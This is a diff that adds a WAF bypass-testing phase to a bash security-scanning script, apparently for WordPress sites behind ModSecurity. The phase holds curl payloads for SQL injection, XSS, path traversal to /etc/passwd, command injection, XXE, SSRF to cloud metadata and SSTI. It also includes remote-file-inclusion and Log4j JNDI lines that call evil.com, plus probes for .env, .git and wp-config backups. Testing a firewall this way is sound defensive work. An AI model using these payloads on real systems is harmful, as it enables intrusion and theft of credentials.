@@ -181,6 +181,125 @@ printf "\r"
 
 green "  Active scan complete"
 
+# ── Phase 4b: Targeted WAF bypass tests ───────────────────────────────────
+
+bold "Phase 4b: Targeted attack payloads"
+
+WAF_PASS=0
+WAF_BLOCK=0
+WAF_TOTAL=0
+
+test_payload() {
+    local name="$1"
+    local url="$2"
+    local method="${3:-GET}"
+    local data="${4:-}"
+    WAF_TOTAL=$((WAF_TOTAL + 1))
+
+    local code
+    if [ "$method" = "POST" ]; then
+        code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 10 -X POST -d "$data" "$url" 2>/dev/null) || true
+    else
+        code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 10 "$url" 2>/dev/null) || true
+    fi
+
+    if [ "$code" = "403" ] || [ "$code" = "406" ] || [ "$code" = "444" ]; then
+        WAF_BLOCK=$((WAF_BLOCK + 1))
+        green "  [BLOCKED] ${name} -> ${code}"
+    else
+        WAF_PASS=$((WAF_PASS + 1))
+        red "  [PASSED]  ${name} -> ${code}"
+    fi
+}
+
+echo ""
+echo "  SQL Injection variants:"
+test_payload "SQLi: UNION SELECT"          "${TARGET}/?id=1+UNION+SELECT+NULL,NULL,NULL--"
+test_payload "SQLi: blind boolean"         "${TARGET}/?id=1+AND+1=1--"
+test_payload "SQLi: blind time"            "${TARGET}/?id=1+AND+SLEEP(5)--"
+test_payload "SQLi: stacked queries"       "${TARGET}/?id=1;DROP+TABLE+users--"
+test_payload "SQLi: hex bypass"            "${TARGET}/?id=0x31+UNION+SELECT+0x61646d696e"
+test_payload "SQLi: double encode"         "${TARGET}/?id=1%2527+OR+1=1--"
+test_payload "SQLi: POST login"            "${TARGET}/wp-login.php" POST "log=admin'+OR+1=1--&pwd=test"
+test_payload "SQLi: comment bypass"        "${TARGET}/?id=1'/**/OR/**/1=1--"
+
+echo ""
+echo "  XSS variants:"
+test_payload "XSS: basic script"           "${TARGET}/?s=<script>alert(1)</script>"
+test_payload "XSS: img onerror"            "${TARGET}/?s=<img+src=x+onerror=alert(1)>"
+test_payload "XSS: SVG onload"             "${TARGET}/?s=<svg/onload=alert(1)>"
+test_payload "XSS: event handler"          "${TARGET}/?s=<body+onload=alert(1)>"
+test_payload "XSS: javascript URI"         "${TARGET}/?s=javascript:alert(document.cookie)"
+test_payload "XSS: data URI"              "${TARGET}/?s=<object+data=data:text/html,<script>alert(1)</script>>"
+test_payload "XSS: polyglot"              "${TARGET}/?s=jaVasCript:/*-/*\`/*\\\`/*'/*\"/**/(/*+*/oNcliCk=alert()+)//"
+
+echo ""
+echo "  Path traversal & LFI:"
+test_payload "LFI: etc/passwd"             "${TARGET}/?file=../../../etc/passwd"
+test_payload "LFI: null byte"              "${TARGET}/?file=../../../etc/passwd%00"
+test_payload "LFI: double encode"          "${TARGET}/?file=..%252f..%252f..%252fetc%252fpasswd"
+test_payload "LFI: php filter"             "${TARGET}/?page=php://filter/convert.base64-encode/resource=/etc/passwd"
+test_payload "LFI: php input"              "${TARGET}/?page=php://input"
+test_payload "LFI: data scheme"            "${TARGET}/?page=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg=="
+test_payload "RFI: external"               "${TARGET}/?page=http://evil.com/shell.txt"
+
+echo ""
+echo "  Command injection:"
+test_payload "CMDi: semicolon"             "${TARGET}/?cmd=;cat+/etc/passwd"
+test_payload "CMDi: pipe"                  "${TARGET}/?cmd=|ls+-la"
+test_payload "CMDi: backtick"              "${TARGET}/?cmd=\`whoami\`"
+test_payload "CMDi: dollar paren"          "${TARGET}/?cmd=\$(id)"
+
+echo ""
+echo "  Log4j / JNDI:"
+test_payload "Log4j: jndi ldap"            "${TARGET}/?x=\${jndi:ldap://evil.com/a}"
+test_payload "Log4j: nested bypass"        "${TARGET}/?x=\${j\${::-n}di:ldap://evil.com}"
+
+echo ""
+echo "  Protocol attacks:"
+test_payload "XXE: xmlrpc"                 "${TARGET}/xmlrpc.php" POST '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
+test_payload "SSRF: metadata"              "${TARGET}/?url=http://169.254.169.254/latest/meta-data/"
+test_payload "SSTI: Jinja2"                "${TARGET}/?name={{7*7}}"
+test_payload "SSTI: class chain"           "${TARGET}/?name={{config.__class__.__init__.__globals__}}"
+
+echo ""
+echo "  WordPress specific:"
+test_payload "WP: wp-config backup"        "${TARGET}/wp-config.php.bak"
+test_payload "WP: debug log"               "${TARGET}/wp-content/debug.log"
+test_payload "WP: user enum REST"          "${TARGET}/wp-json/wp/v2/users"
+test_payload "WP: install.php"             "${TARGET}/wp-admin/install.php"
+test_payload "WP: shell upload path"       "${TARGET}/wp-content/uploads/shell.php"
+test_payload "WP: .env file"               "${TARGET}/.env"
+test_payload "WP: .git HEAD"               "${TARGET}/.git/HEAD"
+test_payload "WP: xmlrpc multicall"        "${TARGET}/xmlrpc.php" POST '<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data></data></array></value></param></params></methodCall>'
+
+echo ""
+echo "  HTTP method probes:"
+for method in TRACE TRACK PUT DELETE; do
+    code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 10 -X "$method" "${TARGET}/" 2>/dev/null) || true
+    if [ "$code" = "405" ] || [ "$code" = "403" ] || [ "$code" = "501" ]; then
+        green "  [BLOCKED] ${method} method -> ${code}"
+        WAF_BLOCK=$((WAF_BLOCK + 1))
+    else
+        yellow "  [ALLOWED] ${method} method -> ${code}"
+    fi
+    WAF_TOTAL=$((WAF_TOTAL + 1))
+done
+
+echo ""
+BLOCK_RATE=0
+if [ "$WAF_TOTAL" -gt 0 ]; then
+    BLOCK_RATE=$((WAF_BLOCK * 100 / WAF_TOTAL))
+fi
+bold "  WAF Block Rate: ${WAF_BLOCK}/${WAF_TOTAL} (${BLOCK_RATE}%)"
+if [ "$BLOCK_RATE" -ge 80 ]; then
+    green "  Excellent WAF coverage"
+elif [ "$BLOCK_RATE" -ge 60 ]; then
+    yellow "  Good WAF coverage, some bypasses detected"
+else
+    red "  Poor WAF coverage — review ModSecurity rules"
+fi
+
 # ── Phase 5: Collect results ──────────────────────────────────────────────
 
 bold "Phase 5: Results"
